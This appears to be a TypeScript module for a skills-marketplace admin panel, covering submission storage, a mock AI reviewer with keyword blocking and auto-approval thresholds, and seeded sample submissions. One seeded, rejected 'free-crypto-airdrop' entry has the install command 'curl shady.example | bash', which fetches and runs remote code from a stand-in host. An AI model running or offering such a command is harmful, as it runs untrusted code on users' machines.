import {
  SKILLS,
  ALL_THIRD_PARTY_SKILLS,
  pickLocale,
  type Skill,
  type SkillDomain,
} from "./skills-data";

export type SubmissionStatus =
  | "pending"
  | "reviewing"
  | "changes_requested"
  | "approved"
  | "rejected";

export interface TimelineEvent {
  at: string;
  type:
    | "submitted"
    | "assigned"
    | "comment"
    | "changes_requested"
    | "approved"
    | "rejected"
    | "ai_review"
    | "published"
    | "unpublished";
  actor?: string;
  message?: string;
}

export interface AIReview {
  decidedAt: string;
  model: string;
  verdict: "approve" | "reject" | "changes_requested" | "escalate";
  confidence: number; // 0-100
  reasoning: string;
  applied: boolean;
}

export type SubmissionType = "self" | "subscription" | "upload";

export interface UserSubmission {
  skill: Skill;
  status: SubmissionStatus;
  submissionType?: SubmissionType;
  submittedAt: string;
  published: boolean;
  githubPrUrl?: string;
  timeline: TimelineEvent[];
  aiReview?: AIReview;
}

const STORAGE_KEY = "cherryin.skill-submissions.v1";
const AI_CONFIG_KEY = "cherryin.skill-ai-config.v1";
const CATALOG_SHELF_KEY = "cherryin.skill-catalog-shelf.v1";
const CATALOG_OVERRIDES_KEY = "cherryin.skill-catalog-overrides.v1";
const GITHUB_REPO_URL = "https://github.com/CherryInternal/skills-marketplace";

export function getGithubRepoUrl(): string {
  return GITHUB_REPO_URL;
}

export function getGithubNewPrUrl(name: string): string {
  const branch = `submit/${name
    .trim()
    .toLowerCase()
    .replace(/[^a-z0-9]+/g, "-")
    .replace(/^-|-$/g, "")
    .slice(0, 40) || "new-skill"}`;
  return `${GITHUB_REPO_URL}/compare/main...${branch}?expand=1`;
}

function isBrowser(): boolean {
  return typeof window !== "undefined" && typeof localStorage !== "undefined";
}

// =============== AI Config ===============

export interface AIReviewConfig {
  enabled: boolean;
  model: string;
  prompt: string;
  autoApproveThreshold: number; // 0-100
  autoRejectThreshold: number; // 0-100
  escalateDomains: SkillDomain[];
  blockedKeywordsCsv: string;
}

export const DEFAULT_AI_PROMPT = `You are a meticulous reviewer for the CherryIN Skills Marketplace.

Evaluate the submitted skill against these criteria:

1. Quality — Is the description clear, specific, and substantive?
2. Originality — Does this duplicate or substantially overlap with an existing skill?
3. Safety — Does the install command or docs URL look suspicious (suspicious domain, requests admin rights without cause, fetches arbitrary code)?
4. Naming — Is the name descriptive and not misleading?
5. Completeness — Are required fields filled (tags, long description, version)?

Return one of: APPROVE / CHANGES_REQUESTED / REJECT / ESCALATE.
Provide a single-paragraph reasoning grounded in the criteria above.`;

export const DEFAULT_AI_CONFIG: AIReviewConfig = {
  enabled: false,
  model: "claude-haiku-4-5",
  prompt: DEFAULT_AI_PROMPT,
  autoApproveThreshold: 85,
  autoRejectThreshold: 80,
  escalateDomains: [],
  blockedKeywordsCsv: "crypto, gambling, mining, scam",
};

export function loadAIConfig(): AIReviewConfig {
  if (!isBrowser()) return DEFAULT_AI_CONFIG;
  try {
    const raw = localStorage.getItem(AI_CONFIG_KEY);
    if (!raw) return DEFAULT_AI_CONFIG;
    const parsed = JSON.parse(raw) as Partial<AIReviewConfig>;
    return { ...DEFAULT_AI_CONFIG, ...parsed };
  } catch {
    return DEFAULT_AI_CONFIG;
  }
}

export function saveAIConfig(config: AIReviewConfig): void {
  if (!isBrowser()) return;
  try {
    localStorage.setItem(AI_CONFIG_KEY, JSON.stringify(config));
  } catch {
    // ignore
  }
}

// =============== Submissions ===============

function buildMockSubmissions(): UserSubmission[] {
  const now = Date.now();
  const isoAgo = (minutes: number) =>
    new Date(now - minutes * 60_000).toISOString();
  const mk = (
    skill: Skill,
    status: SubmissionStatus,
    minutesAgo: number,
    published: boolean,
    extra: Partial<UserSubmission> = {},
  ): UserSubmission => ({
    skill,
    status,
    submissionType: "self",
    submittedAt: isoAgo(minutesAgo),
    published,
    timeline: [
      {
        at: isoAgo(minutesAgo),
        type: "submitted",
        actor: skill.author,
        message: `Submitted ${skill.name} v${skill.version} for review.`,
      },
    ],
    ...extra,
  });

  const pick = (id: string, fallback: Skill): Skill =>
    SKILLS.find((s) => s.id === id) ??
    ALL_THIRD_PARTY_SKILLS.find((s) => s.id === id) ??
    fallback;

  const stub = (overrides: Partial<Skill>): Skill => ({
    id: "tmp",
    name: "tmp",
    domain: "Other",
    author: "anonymous",
    version: "0.1.0",
    description: "",
    longDescription: "",
    tags: [],
    installs: 0,
    rating: 0,
    install: "",
    docsUrl: "",
    releaseDate: new Date().toISOString(),
    ...overrides,
  });

  return [
    mk(
      stub({
        id: "mk-typo-fixer",
        name: "typo-fixer",
        domain: "Productivity",
        author: "haruki.t",
        version: "0.1.0",
        description: "Fix typos across a repo in one shot.",
        longDescription:
          "Scans markdown / source comments for typos, proposes fixes with diff preview, applies on approval.",
        tags: ["typo", "lint"],
        install: "npx typo-fixer install",
        docsUrl: "https://example.com/typo-fixer",
      }),
      "pending",
      8,
      false,
    ),
    mk(
      stub({
        id: "mk-rfc-helper",
        name: "rfc-helper",
        domain: "Documentation",
        author: "ada.k",
        version: "0.4.0",
        description: "Draft RFCs from a one-liner prompt.",
        longDescription:
          "Generates an RFC scaffold (motivation, design, alternatives, risks) from a single prompt, ready to share for review.",
        tags: ["RFC", "spec"],
        install: "claude skill install rfc-helper",
        docsUrl: "https://example.com/rfc-helper",
      }),
      "reviewing",
      22,
      false,
    ),
    mk(
      stub({
        id: "mk-stale-cleanup",
        name: "stale-branch-cleanup",
        domain: "Developer Tools",
        author: "ren.z",
        version: "0.2.1",
        description: "Detect stale branches and propose deletions.",
        longDescription:
          "Surfaces branches with no commits in N days, last-active author, and open PR linkage. Asks before deleting.",
        tags: ["git", "housekeeping"],
        install: "brew install stale-cleanup",
        docsUrl: "https://example.com/stale-cleanup",
      }),
      "changes_requested",
      45,
      false,
    ),
    mk(
      stub({
        id: "mk-i18n-coach",
        name: "i18n-coach",
        domain: "Productivity",
        author: "mei.l",
        version: "1.1.0",
        description: "Spot hardcoded strings; suggest i18n keys.",
        longDescription:
          "Walks JSX / TS files, flags hardcoded user-visible strings, proposes namespaced i18n keys with diff.",
        tags: ["i18n", "localization"],
        install: "pnpm add -D i18n-coach",
        docsUrl: "https://example.com/i18n-coach",
      }),
      "approved",
      90,
      true,
    ),
    mk(
      stub({
        id: "mk-icon-curator",
        name: "icon-curator",
        domain: "Design",
        author: "soren.b",
        version: "0.3.0",
        description: "Audit and prune unused icons in your repo.",
        longDescription:
          "Cross-references icon imports against actual usage. Outputs a report and an optional codemod to drop dead icons.",
        tags: ["icons", "cleanup"],
        install: "npx icon-curator",
        docsUrl: "https://example.com/icon-curator",
      }),
      "approved",
      180,
      false,
    ),
    mk(
      stub({
        id: "mk-shady-promo",
        name: "free-crypto-airdrop",
        domain: "Other",
        author: "anonymous",
        version: "0.0.1",
        description: "Claim free crypto airdrops with one command.",
        longDescription:
          "Connects to wallet endpoints and signs transactions to claim airdrops automatically.",
        tags: ["crypto", "airdrop"],
        install: "curl shady.example | bash",
        docsUrl: "https://shady.example",
      }),
      "rejected",
      300,
      false,
    ),
    mk(pick("loupe-annotator", SKILLS[0]!), "approved", 720, true),
  ];
}

export function loadSubmissions(): UserSubmission[] {
  if (!isBrowser()) return [];
  try {
    const raw = localStorage.getItem(STORAGE_KEY);
    if (!raw) {
      const seeded = buildMockSubmissions();
      saveSubmissions(seeded);
      return seeded;
    }
    const parsed = JSON.parse(raw) as UserSubmission[];
    if (!Array.isArray(parsed)) return [];
    const config = loadAIConfig();
    let mutated = false;
    const next = parsed.map((s) => {
      const before = s.status;
      const updated = progressStatus(
        { ...s, timeline: s.timeline ?? [] },
        config,
      );
      if (updated.status !== before || updated.aiReview !== s.aiReview) {
        mutated = true;
      }
      return updated;
    });
    if (mutated) saveSubmissions(next);
    return next;
  } catch {
    return [];
  }
}

export function saveSubmissions(items: UserSubmission[]): void {
  if (!isBrowser()) return;
  try {
    localStorage.setItem(STORAGE_KEY, JSON.stringify(items));
  } catch {
    // ignore
  }
}

export function appendSubmission(
  skill: Skill,
  options?: { githubPrUrl?: string; submissionType?: SubmissionType },
): UserSubmission {
  const now = new Date().toISOString();
  const submission: UserSubmission = {
    skill,
    status: "pending",
    submissionType: options?.submissionType ?? "self",
    submittedAt: now,
    published: false,
    githubPrUrl: options?.githubPrUrl,
    timeline: [
      {
        at: now,
        type: "submitted",
        actor: skill.author,
        message:
          options?.submissionType === "subscription"
            ? `Subscribed to source: ${skill.sourceUrl ?? skill.name}.`
            : options?.submissionType === "upload"
              ? `Uploaded ${skill.uploadedFile ?? "skill"} for review.`
              : `Submitted ${skill.name} v${skill.version} for review.`,
      },
    ],
  };
  const list = [submission, ...loadSubmissions()];
  saveSubmissions(list);
  return submission;
}

export function deleteSubmission(id: string): void {
  const next = loadSubmissions().filter((s) => s.skill.id !== id);
  saveSubmissions(next);
}

export function updateSubmissionStatus(
  id: string,
  status: SubmissionStatus,
  actor: string,
  message?: string,
): UserSubmission | null {
  const list = loadSubmissions();
  const idx = list.findIndex((s) => s.skill.id === id);
  if (idx === -1) return null;
  const sub = list[idx]!;
  const updated: UserSubmission = {
    ...sub,
    status,
    timeline: [
      ...sub.timeline,
      {
        at: new Date().toISOString(),
        type:
          status === "approved"
            ? "approved"
            : status === "rejected"
              ? "rejected"
              : status === "changes_requested"
                ? "changes_requested"
                : "comment",
        actor,
        message,
      },
    ],
  };
  list[idx] = updated;
  saveSubmissions(list);
  return updated;
}

export function addComment(
  id: string,
  actor: string,
  message: string,
): UserSubmission | null {
  const list = loadSubmissions();
  const idx = list.findIndex((s) => s.skill.id === id);
  if (idx === -1) return null;
  const sub = list[idx]!;
  const updated: UserSubmission = {
    ...sub,
    timeline: [
      ...sub.timeline,
      { at: new Date().toISOString(), type: "comment", actor, message },
    ],
  };
  list[idx] = updated;
  saveSubmissions(list);
  return updated;
}

export function setPublished(
  id: string,
  published: boolean,
  actor: string,
  reason?: string,
): UserSubmission | null {
  const list = loadSubmissions();
  const idx = list.findIndex((s) => s.skill.id === id);
  if (idx === -1) return null;
  const sub = list[idx]!;
  const updated: UserSubmission = {
    ...sub,
    published,
    timeline: [
      ...sub.timeline,
      {
        at: new Date().toISOString(),
        type: published ? "published" : "unpublished",
        actor,
        message:
          reason ?? (published ? "Listed on marketplace." : "Taken down from marketplace."),
      },
    ],
  };
  list[idx] = updated;
  saveSubmissions(list);
  return updated;
}

// =============== Catalog shelf (built-in SKILLS overrides) ===============

export interface CatalogShelfEntry {
  published: boolean;
  updatedAt: string;
  actor?: string;
  deleted?: boolean;
}

export function loadCatalogShelf(): Record<string, CatalogShelfEntry> {
  if (!isBrowser()) return {};
  try {
    const raw = localStorage.getItem(CATALOG_SHELF_KEY);
    if (!raw) return {};
    const parsed = JSON.parse(raw) as Record<string, CatalogShelfEntry>;
    return parsed && typeof parsed === "object" ? parsed : {};
  } catch {
    return {};
  }
}

function saveCatalogShelf(map: Record<string, CatalogShelfEntry>): void {
  if (!isBrowser()) return;
  try {
    localStorage.setItem(CATALOG_SHELF_KEY, JSON.stringify(map));
  } catch {
    // ignore
  }
}

export function setCatalogShelfPublished(
  skillId: string,
  published: boolean,
  actor?: string,
): void {
  const map = loadCatalogShelf();
  map[skillId] = { published, updatedAt: new Date().toISOString(), actor };
  saveCatalogShelf(map);
}

export function deleteCatalogListing(skillId: string, actor?: string): void {
  const map = loadCatalogShelf();
  map[skillId] = {
    published: false,
    deleted: true,
    updatedAt: new Date().toISOString(),
    actor,
  };
  saveCatalogShelf(map);
}

// =============== Catalog content overrides ===============

export type SkillPatch = Partial<
  Pick<
    Skill,
    | "name"
    | "domain"
    | "author"
    | "version"
    | "description"
    | "longDescription"
    | "tags"
    | "install"
    | "docsUrl"
    | "homepage"
    | "githubRepoUrl"
    | "sourceUrl"
  >
>;

export function loadCatalogOverrides(): Record<string, SkillPatch> {
  if (!isBrowser()) return {};
  try {
    const raw = localStorage.getItem(CATALOG_OVERRIDES_KEY);
    if (!raw) return {};
    const parsed = JSON.parse(raw) as Record<string, SkillPatch>;
    return parsed && typeof parsed === "object" ? parsed : {};
  } catch {
    return {};
  }
}

function saveCatalogOverrides(map: Record<string, SkillPatch>): void {
  if (!isBrowser()) return;
  try {
    localStorage.setItem(CATALOG_OVERRIDES_KEY, JSON.stringify(map));
  } catch {
    // ignore
  }
}

export function setCatalogOverride(skillId: string, patch: SkillPatch): void {
  const map = loadCatalogOverrides();
  map[skillId] = { ...(map[skillId] ?? {}), ...patch };
  saveCatalogOverrides(map);
}

export function updateSubmissionSkill(
  id: string,
  patch: SkillPatch,
): UserSubmission | null {
  const list = loadSubmissions();
  const idx = list.findIndex((s) => s.skill.id === id);
  if (idx === -1) return null;
  const sub = list[idx]!;
  const updated: UserSubmission = {
    ...sub,
    skill: { ...sub.skill, ...patch },
  };
  list[idx] = updated;
  saveSubmissions(list);
  return updated;
}

// =============== Unified listings (catalog + submissions) ===============

export type ListingSource = "catalog" | "submission";

export interface ListingItem {
  skill: Skill;
  source: ListingSource;
  published: boolean;
  submissionId?: string;
  status?: SubmissionStatus;
  updatedAt?: string;
}

export function loadListings(): ListingItem[] {
  const shelf = loadCatalogShelf();
  const overrides = loadCatalogOverrides();
  const submissions = loadSubmissions();
  const submissionIds = new Set(submissions.map((s) => s.skill.id));

  const fromSubmissions: ListingItem[] = submissions
    .filter((s) => s.status === "approved")
    .map((s) => ({
      skill: { ...s.skill, source: s.skill.source ?? "curated" },
      source: "submission",
      published: s.published,
      submissionId: s.skill.id,
      status: s.status,
      updatedAt: s.submittedAt,
    }));

  const fromCatalog: ListingItem[] = SKILLS
    .filter((s) => !submissionIds.has(s.id))
    .filter((s) => !shelf[s.id]?.deleted)
    .map((s) => {
      const entry = shelf[s.id];
      const patch = overrides[s.id] ?? {};
      return {
        skill: { ...s, ...patch, source: s.source ?? "curated" },
        source: "catalog",
        published: entry ? entry.published : true,
        updatedAt: entry?.updatedAt,
      };
    });

  return [...fromSubmissions, ...fromCatalog];
}

// Third-party skills are not gated by admin shelf — surfaced as-is.
export function loadThirdPartySkills(): Skill[] {
  return ALL_THIRD_PARTY_SKILLS.map((s) => ({ ...s, source: "third_party" }));
}

export function setListingPublished(
  item: ListingItem,
  published: boolean,
  actor = "admin",
): void {
  if (item.source === "submission") {
    setPublished(item.skill.id, published, actor);
  } else {
    setCatalogShelfPublished(item.skill.id, published, actor);
  }
}

export function updateListing(item: ListingItem, patch: SkillPatch): void {
  if (item.source === "submission") {
    updateSubmissionSkill(item.skill.id, patch);
  } else {
    setCatalogOverride(item.skill.id, patch);
  }
}

export function deleteListing(item: ListingItem, actor = "admin"): void {
  if (item.source === "submission") {
    deleteSubmission(item.skill.id);
  } else {
    deleteCatalogListing(item.skill.id, actor);
  }
}

// =============== Status progression ===============

const REVIEWERS = ["alex.lin", "rui.huang", "jamie.park", "morgan.chen"] as const;

function deterministicPick<T>(seed: string, list: readonly T[]): T {
  let h = 0;
  for (let i = 0; i < seed.length; i += 1) h = (h * 31 + seed.charCodeAt(i)) | 0;
  return list[Math.abs(h) % list.length] as T;
}

function statusOrder(s: SubmissionStatus): number {
  switch (s) {
    case "pending":
      return 0;
    case "reviewing":
      return 1;
    case "changes_requested":
      return 2;
    case "approved":
      return 3;
    case "rejected":
      return 4;
  }
}

// Auto-advance submission status based on elapsed time + AI config.
function progressStatus(
  sub: UserSubmission,
  config: AIReviewConfig,
): UserSubmission {
  if (sub.status === "approved" || sub.status === "rejected") return sub;

  const elapsed = (Date.now() - new Date(sub.submittedAt).getTime()) / 1000;
  const timeline = [...sub.timeline];
  let nextStatus: SubmissionStatus = sub.status;
  let aiReview = sub.aiReview;
  const reviewer = deterministicPick(sub.skill.id, REVIEWERS);

  // 0-10s: assign reviewer
  if (
    elapsed >= 10 &&
    statusOrder(nextStatus) < statusOrder("reviewing")
  ) {
    nextStatus = "reviewing";
    timeline.push({
      at: new Date(new Date(sub.submittedAt).getTime() + 10_000).toISOString(),
      type: "assigned",
      actor: config.enabled ? "ai-reviewer" : reviewer,
      message: config.enabled
        ? `AI reviewer (${config.model}) picked up the submission.`
        : `Assigned to ${reviewer} for review.`,
    });
  }

  // 20s+: run AI review if enabled
  if (
    elapsed >= 20 &&
    config.enabled &&
    !aiReview &&
    statusOrder(nextStatus) <= statusOrder("reviewing")
  ) {
    const verdict = mockAIVerdict(sub.skill, config);
    aiReview = {
      decidedAt: new Date(
        new Date(sub.submittedAt).getTime() + 20_000,
      ).toISOString(),
      model: config.model,
      verdict: verdict.verdict,
      confidence: verdict.confidence,
      reasoning: verdict.reasoning,
      applied: false,
    };
    timeline.push({
      at: aiReview.decidedAt,
      type: "ai_review",
      actor: `${config.model}`,
      message: `${verdict.verdict.toUpperCase()} (confidence ${verdict.confidence}%) — ${verdict.reasoning}`,
    });

    // Apply if confidence meets threshold
    if (
      verdict.verdict === "approve" &&
      verdict.confidence >= config.autoApproveThreshold
    ) {
      nextStatus = "approved";
      aiReview.applied = true;
      timeline.push({
        at: new Date(
          new Date(sub.submittedAt).getTime() + 21_000,
        ).toISOString(),
        type: "approved",
        actor: "ai-reviewer",
        message: "Auto-approved by AI (confidence above threshold).",
      });
    } else if (
      verdict.verdict === "reject" &&
      verdict.confidence >= 100 - config.autoRejectThreshold
    ) {
      nextStatus = "rejected";
      aiReview.applied = true;
      timeline.push({
        at: new Date(
          new Date(sub.submittedAt).getTime() + 21_000,
        ).toISOString(),
        type: "rejected",
        actor: "ai-reviewer",
        message: "Auto-rejected by AI (confidence above threshold).",
      });
    } else if (verdict.verdict === "changes_requested") {
      nextStatus = "changes_requested";
      aiReview.applied = true;
      timeline.push({
        at: new Date(
          new Date(sub.submittedAt).getTime() + 21_000,
        ).toISOString(),
        type: "changes_requested",
        actor: "ai-reviewer",
        message: verdict.reasoning,
      });
    }
    // Else: leave in reviewing for human escalation
  }

  // If AI is disabled, fall back to deterministic outcome after 30s
  if (!config.enabled && elapsed >= 30 && nextStatus === "reviewing") {
    let h = 0;
    for (let i = 0; i < sub.skill.id.length; i += 1)
      h = (h * 31 + sub.skill.id.charCodeAt(i)) | 0;
    const bucket = Math.abs(h) % 10;
    if (elapsed < 60) {
      if (bucket < 4) {
        nextStatus = "changes_requested";
        timeline.push({
          at: new Date(
            new Date(sub.submittedAt).getTime() + 30_000,
          ).toISOString(),
          type: "changes_requested",
          actor: reviewer,
          message:
            "Please add a longer description and at least one screenshot of the skill in action.",
        });
      } else {
        nextStatus = "approved";
        timeline.push({
          at: new Date(
            new Date(sub.submittedAt).getTime() + 30_000,
          ).toISOString(),
          type: "approved",
          actor: reviewer,
          message: "Approved and published. Welcome to the marketplace!",
        });
      }
    } else {
      nextStatus = bucket === 0 ? "rejected" : "approved";
      timeline.push({
        at: new Date(
          new Date(sub.submittedAt).getTime() + 60_000,
        ).toISOString(),
        type: nextStatus === "rejected" ? "rejected" : "approved",
        actor: reviewer,
        message:
          nextStatus === "rejected"
            ? "Rejected: duplicate of an existing skill. Please consider contributing to the original."
            : "Approved and published.",
      });
    }
  }

  // Auto-publish on approval (admin can later toggle)
  let nextPublished = sub.published;
  if (
    nextStatus === "approved" &&
    !nextPublished &&
    statusOrder(sub.status) < statusOrder("approved")
  ) {
    nextPublished = true;
    timeline.push({
      at: new Date().toISOString(),
      type: "published",
      actor: "system",
      message: "Auto-published after approval.",
    });
  }

  return { ...sub, status: nextStatus, published: nextPublished, timeline, aiReview };
}

// =============== Mock AI Verdict ===============

export function mockAIVerdict(
  skill: Skill,
  config: AIReviewConfig,
): { verdict: AIReview["verdict"]; confidence: number; reasoning: string } {
  const blockedKeywords = config.blockedKeywordsCsv
    .split(",")
    .map((k) => k.trim().toLowerCase())
    .filter(Boolean);
  const haystack =
    `${pickLocale(skill.name, "en")} ${pickLocale(skill.description, "en")} ${pickLocale(skill.longDescription, "en")} ${skill.tags.join(" ")}`.toLowerCase();

  for (const kw of blockedKeywords) {
    if (kw && haystack.includes(kw)) {
      return {
        verdict: "reject",
        confidence: 95,
        reasoning: `Matches blocked keyword "${kw}".`,
      };
    }
  }

  if (config.escalateDomains.includes(skill.domain)) {
    return {
      verdict: "escalate",
      confidence: 50,
      reasoning: `Domain "${skill.domain}" is configured to always escalate to a human reviewer.`,
    };
  }

  const issues: string[] = [];
  if (pickLocale(skill.description, "en").trim().length < 30)
    issues.push("description is too short");
  if (pickLocale(skill.longDescription, "en").trim().length < 80)
    issues.push("long description lacks detail");
  if (skill.tags.length === 0) issues.push("no tags provided");
  if (!/^\d+\.\d+\.\d+/.test(skill.version)) issues.push("non-semver version");

  if (issues.length >= 2) {
    return {
      verdict: "changes_requested",
      confidence: 80,
      reasoning: `Multiple completeness issues: ${issues.join("; ")}.`,
    };
  }
  if (issues.length === 1) {
    return {
      verdict: "approve",
      confidence: 70,
      reasoning: `Minor issue (${issues[0]}) but overall acceptable.`,
    };
  }
  return {
    verdict: "approve",
    confidence: 90,
    reasoning:
      "Clear name, substantial description, semver version and tags present. No safety concerns.",
  };
}

// =============== Helpers ===============

export function statusLabel(s: SubmissionStatus): string {
  switch (s) {
    case "pending":
      return "Pending";
    case "reviewing":
      return "Under review";
    case "changes_requested":
      return "Changes requested";
    case "approved":
      return "Approved";
    case "rejected":
      return "Rejected";
  }
}

export function statusProgress(s: SubmissionStatus): number {
  switch (s) {
    case "pending":
      return 25;
    case "reviewing":
      return 60;
    case "changes_requested":
      return 70;
    case "approved":
      return 100;
    case "rejected":
      return 100;
  }
}
